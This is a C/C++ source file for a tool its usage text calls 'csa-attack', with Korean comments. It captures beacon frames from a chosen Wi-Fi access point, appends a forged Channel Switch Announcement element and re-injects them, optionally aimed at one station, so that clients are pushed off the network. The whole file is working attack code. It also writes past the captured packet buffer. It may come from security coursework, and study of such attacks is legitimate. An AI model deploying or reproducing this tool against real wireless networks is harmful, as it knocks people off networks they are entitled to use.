#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>
#include <signal.h>
#include <algorithm>

void usage();
void macStringToUint8(char *mac_string, uint8_t *ap_mac);
void handleSignal(int signal);
void cleanup(pcap_t *handle);
void process_packet(struct pcap_pkthdr *header, unsigned char *packet, char *station_mac);

pcap_t *global_handle;

int main(int argc, char *argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }
    
    char *interfaceName = argv[1];
    char *ap_mac = argv[2];
    char *station_mac = argv[3];
    if (station_mac != NULL) {
        printf("Unicast Mode\n");
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interfaceName, errbuf);
        return -1;
    }

    // Beacon Frame 필터를 설정
    struct bpf_program fp;
    char filter_exp[100];
    snprintf(filter_exp, sizeof(filter_exp), "type mgt subtype beacon and ether host %s", argv[2]);
    if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return -1;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return -1;
    }
    global_handle = handle;
    signal(SIGINT, handleSignal);

    while (true) {
        struct pcap_pkthdr *header;
        // unsigned char *cap_packet;

        u_char *cap_packet;
        int result = pcap_next_ex(global_handle, &header, (const u_char **)&cap_packet);

        if (result == 1) {  // 정상적으로 패킷을 가져온 경우
            process_packet(header, cap_packet, station_mac);
        } else if (result == -1) {  // 에러가 발생한 경우
            fprintf(stderr, "Error occurred while capturing packets: %s\n", pcap_geterr(handle));
        } else if (result == 0) {  // 타임아웃이 발생한 경우
            printf("Time Out\n");
            pcap_close(handle);
            exit(0);
        }
        usleep(100000);
    }

    cleanup(handle);
    return 0;
}

void usage() {
    printf("Syntax is incorrect.\n");
    printf("syntax : csa-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void macStringToUint8(char *mac_string, uint8_t *ap_mac) {
    sscanf(mac_string, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2],
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);
}

void handleSignal(int signal) {
    printf("Entered Ctrl+C, exit program\n");
    cleanup(global_handle);
    exit(0);
}

void cleanup(pcap_t *handle) {
    printf("pcap close!\n");
    pcap_close(handle);
}

void process_packet(struct pcap_pkthdr *header, unsigned char *packet, char *station_mac) {
    // Random Channel set
    uint8_t channel = rand() % 13 + 1;
    unsigned char EPR[] = {0x2a, 0x01,0x00};
    uint8_t csa_data[5] = {0x25, 0x03, 0x01, 0x0D, 0x3};
    uint8_t broadcast_addr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    memcpy(packet + header->caplen, csa_data, sizeof(csa_data));
    header->caplen += sizeof(csa_data);
    // EPR을 찾고 CSA 데이터 삽입
    // auto it = std::search(packet, packet + header->caplen, EPR, EPR + sizeof(EPR));
    // if (it != NULL) {
    //     size_t offset = it - packet;
    //     memmove(packet + offset + sizeof(csa_data), packet + offset, header->caplen - offset);
    //     memcpy(packet + offset, csa_data, 5);
    // } else {
    //     printf("EPR not found\n");
    // }

    // Unicast 대상인 경우, destination_address 수정
    if (station_mac != NULL) {
        auto bmac = std::search(packet, packet + header->caplen, broadcast_addr, broadcast_addr + sizeof(broadcast_addr));
        if (bmac != NULL) {
            uint8_t station_mac_addr[6];
            macStringToUint8(station_mac, station_mac_addr);
            size_t dst_offset = bmac - packet;
            memcpy(packet + dst_offset, station_mac_addr, sizeof(station_mac_addr));
        }
    }

    // 패킷 전송
    if (pcap_sendpacket(global_handle, packet, header->caplen) != 0) {
        fprintf(stderr, "Frame send failed\n");
        cleanup(global_handle);
        exit(-1);
    }
}